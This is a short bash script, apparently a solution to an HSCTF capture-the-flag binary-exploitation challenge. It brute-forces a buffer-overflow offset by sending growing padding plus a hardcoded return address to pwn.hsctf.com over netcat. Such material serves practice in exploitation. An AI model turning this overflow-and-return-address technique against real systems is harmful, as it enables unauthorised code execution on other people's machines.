val=""
tmp=""

for i in {0000..9999}
do
    val="$vala"
    #tmp="$val\xd9\x11\x40\x00\x00"
    tmp="$val\xd9\x11\x40\x00\x00\x00\x00\x00"

    echo "$tmp" | nc pwn.hsctf.com 5002
done


exit
